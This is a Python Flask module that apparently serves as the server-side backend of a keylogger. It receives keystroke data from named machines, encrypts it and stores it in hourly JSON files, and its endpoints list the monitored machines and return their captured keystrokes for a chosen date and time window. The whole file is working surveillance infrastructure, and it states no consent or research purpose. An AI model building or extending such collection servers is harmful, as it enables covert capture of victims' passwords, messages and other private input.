import os, json
from datetime import datetime, time as dtime
from flask import jsonify
from utils import Encryptor, deep_merge, ptime, hour_from_fname, timekey

LOG_DIR = "server_logs"

def save_notification(text):
    file_path = "notifications.json"
    alerts = []
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            alerts = json.load(f)
    alerts.append(text)
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(alerts, f, ensure_ascii=False, indent=2)

def save_keystrokes(data):
    enc = Encryptor()
    data = enc.encrypt_dict(data)
    machine = next(iter(data))
    payload = data.pop(machine)
    folder = os.path.join(LOG_DIR, machine)
    os.makedirs(folder, exist_ok=True)
    path = os.path.join(folder, f"{datetime.now():%Y-%m-%d_%H}.json")

    base = {}
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                base = dict(json.load(f))
        except: base = {}

    flat = payload.pop(next(iter(payload)))
    merged = deep_merge(flat, base)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(merged, f, indent=4, ensure_ascii=False)
    return path

def get_machines_list():
    return jsonify(os.listdir(LOG_DIR)) if os.path.exists(LOG_DIR) else jsonify([])

def get_keystrokes(request):
    machine = request.args.get("machine")
    if not machine:
        return jsonify({"error": "Missing machine"}), 400

    date_str = request.args.get("date")
    start_t = ptime(request.args.get("start")) or dtime(0,0,0)
    end_t   = ptime(request.args.get("end"))   or dtime(23,59,59)
    if start_t > end_t: start_t, end_t = end_t, start_t

    folder = os.path.join(LOG_DIR, machine)
    if not os.path.isdir(folder): return jsonify([])

    files = [f for f in os.listdir(folder) if f.endswith(".json")]
    if date_str: files = [f for f in files if f.startswith(f"{date_str}_")]
    sh, eh = start_t.hour, end_t.hour
    files = [f for f in files if ((h:=hour_from_fname(f)) is not None and sh <= h <= eh)]
    files.sort()

    out = []
    for f in files:
        p = os.path.join(folder, f)
        try:
            with open(p, "r", encoding="utf-8") as fh:
                obj = json.load(fh)
        except Exception:
            with open(p, "r", encoding="utf-8") as fh:
                out.append(fh.read())
            continue

        if not isinstance(obj, dict):
            out.append(json.dumps(obj, ensure_ascii=False))
            continue

        filtered = {k:v for k,v in obj.items()
                    if (t:=timekey(k)) is None or (start_t <= t <= end_t)}
        if filtered:
            out.append(json.dumps(filtered, ensure_ascii=False, indent=2))
    return jsonify(out)
